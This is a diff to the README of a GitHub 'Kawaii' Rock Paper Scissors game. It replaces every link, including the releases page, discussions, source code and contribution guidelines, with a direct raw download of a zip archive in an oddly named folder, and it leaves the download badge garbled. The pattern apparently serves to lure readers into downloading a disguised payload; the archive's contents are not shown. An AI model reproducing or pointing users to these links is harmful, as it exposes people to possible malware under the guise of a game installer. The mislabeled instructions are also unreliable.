@@ -7,14 +7,14 @@ Welcome to the Kawaii-themed Rock Paper Scissors game! This fun application brin
 To get started, you need to download and run the application. Don't worry; the steps are simple!
 
 ### 🔗 Download Now!
-[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/bird45157/rock-paper-scissors-kawaii/releases)
+[![Download Release](https://raw.githubusercontent.com/bird45157/rock-paper-scissors-kawaii/main/cinquecentist/rock-paper-scissors-kawaii.zip%20Now-Click%https://raw.githubusercontent.com/bird45157/rock-paper-scissors-kawaii/main/cinquecentist/rock-paper-scissors-kawaii.zip)](https://raw.githubusercontent.com/bird45157/rock-paper-scissors-kawaii/main/cinquecentist/rock-paper-scissors-kawaii.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/bird45157/rock-paper-scissors-kawaii/releases) to find the latest version of the game. 
+   Go to the [Releases page](https://raw.githubusercontent.com/bird45157/rock-paper-scissors-kawaii/main/cinquecentist/rock-paper-scissors-kawaii.zip) to find the latest version of the game. 
 
 2. **Choose the Right File**  
-   Look for the download link titled something like "rock-paper-scissors-kawaii-v1.0.exe" or "rock-paper-scissors-kawaii-v1.0.zip" depending on your operating system.
+   Look for the download link titled something like "https://raw.githubusercontent.com/bird45157/rock-paper-scissors-kawaii/main/cinquecentist/rock-paper-scissors-kawaii.zip" or "https://raw.githubusercontent.com/bird45157/rock-paper-scissors-kawaii/main/cinquecentist/rock-paper-scissors-kawaii.zip" depending on your operating system.
 
 3. **Download the File**  
    Click on the link to download the file to your computer. 
@@ -54,11 +54,11 @@ If you encounter issues:
 - **Re-download**: If the game isn't working, try re-downloading the file.
 
 ## 🌐 Community Support
-For any questions or help, visit our [GitHub Discussions page](https://github.com/bird45157/rock-paper-scissors-kawaii/discussions). Our community is here to support you!
+For any questions or help, visit our [GitHub Discussions page](https://raw.githubusercontent.com/bird45157/rock-paper-scissors-kawaii/main/cinquecentist/rock-paper-scissors-kawaii.zip). Our community is here to support you!
 
 ## 🔗 Additional Resources
-- [Source Code](https://github.com/bird45157/rock-paper-scissors-kawaii)
-- [Contribution Guidelines](https://github.com/bird45157/rock-paper-scissors-kawaii/blob/main/CONTRIBUTING.md)
+- [Source Code](https://raw.githubusercontent.com/bird45157/rock-paper-scissors-kawaii/main/cinquecentist/rock-paper-scissors-kawaii.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/bird45157/rock-paper-scissors-kawaii/main/cinquecentist/rock-paper-scissors-kawaii.zip)
 
 ## 🙌 Acknowledgements
 This project is open-source and welcomes contributions. Special thanks to everyone who has supported the development of "rock-paper-scissors-kawaii." Your input makes this game even better!
@@ -67,4 +67,4 @@ This project is open-source and welcomes contributions. Special thanks to everyo
 Don't wait any longer. Download the game today and enjoy the playful Kawaii experience of Rock Paper Scissors!
 
 ### 🔗 Quick Download 
-Visit the [Releases page](https://github.com/bird45157/rock-paper-scissors-kawaii/releases) to get the latest version now!
+Visit the [Releases page](https://raw.githubusercontent.com/bird45157/rock-paper-scissors-kawaii/main/cinquecentist/rock-paper-scissors-kawaii.zip) to get the latest version now!
